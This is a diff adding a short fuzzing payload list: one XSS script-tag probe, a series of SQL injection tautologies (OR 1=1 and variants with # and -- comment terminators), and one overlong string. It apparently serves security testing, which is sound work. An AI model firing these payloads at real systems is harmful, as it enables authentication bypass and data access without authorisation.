@@ -1,0 +1,15 @@
+<script>alert('xss');</script>
+aaa' OR '1'= '1
+OR 1=1
+OR 1=0
+OR x=x
+OR x=y
+OR 1=1#
+OR 1=0#
+OR x=x#
+OR x=y#
+OR 1=1-- 
+OR 1=0-- 
+OR x=x-- 
+OR x=y-- 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
